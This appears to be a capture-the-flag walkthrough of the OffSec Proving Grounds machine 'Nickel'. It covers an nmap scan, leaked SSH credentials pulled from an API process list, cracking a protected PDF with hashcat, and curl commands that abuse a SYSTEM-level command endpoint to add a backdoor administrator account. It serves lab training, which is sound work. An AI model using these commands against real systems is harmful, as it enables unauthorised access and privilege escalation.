---
title: "PG: Nickel"
date: 2023-01-15
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/nickel/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - api-enumeration
  - curl
  - pdf-cracking
  - command-injection
categories:
  - walkthrough
---

{{< box-info name="Nickel" os="Windows" difficulty="Medium" ip="192.168.57.99" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
22/tcp    open  ssh           OpenSSH for_Windows_8.1
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0
```
{{< /collapse >}}

Two HTTP APIs on non-standard ports. FTP requires credentials, no anonymous access.

### Port 8089 - Web Interface

The web UI on 8089 has forms that submit requests to an internal API at `169.254.109.39:33333` -- a link-local address. The endpoints:

- `/list-current-deployments`
- `/list-running-procs`
- `/list-active-nodes`

### Port 33333 - Internal API

Hitting the API endpoints directly from the browser returns nothing useful. But the API responds differently depending on the HTTP method.

---

## Foothold

### API Enumeration with curl

The API requires specific request formatting. After testing different methods and headers, `curl` with the `-d` flag (which sets Content-Length and switches to POST) gets a response:

```bash
curl -d '' http://192.168.57.99:33333/list-running-procs
```

The process list output contains credentials in a command line argument:

```
ariah : NowiseSloopTheory139
```

SSH as `ariah` -- we're in.

---

## Lateral Movement

### PDF Cracking → DevOps Access

Exploring the filesystem, we find `Infrastructure.pdf` in the FTP directory. Download it via FTP (passive mode, be patient).

The PDF is password-protected. Crack it:

```bash
pdf2john Infrastructure.pdf > hash
hashcat -m 10500 hash wordlist
# Password: ariah4168
```

The PDF reveals an internal DevOps endpoint running on `http://nickel/` that accepts commands via URL parameters and executes them as SYSTEM.

Verify from the SSH shell:

```bash
curl http://nickel/?whoami
# nt authority\system
```

---

## Privilege Escalation

### Command Injection via DevOps Endpoint

The DevOps service executes URL parameters as system commands. Create a new admin user (URL-encode the payloads):

```bash
curl "http://nickel/?net%20user%20evil%20tetyaMasha99%20/add"
curl "http://nickel/?net%20localgroup%20administrators%20evil%20/add"
curl "http://nickel/?net%20localgroup%20%22Remote%20Desktop%20Users%22%20evil%20/add"
```

RDP as `evil:tetyaMasha99` with full admin rights.

---

## Proof

{{< terminal title="root@nickel" >}}
whoami
nt authority\system
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- APIs that don't respond in the browser might respond to different HTTP methods or headers -- always test with `curl`
- Internal link-local addresses (`169.254.x.x`) in web forms hint at services accessible from the target itself
- Password-protected PDFs on target systems often contain infrastructure secrets -- always crack them
- DevOps/management endpoints running as SYSTEM with no auth are instant domain compromise
{{< /callout >}}
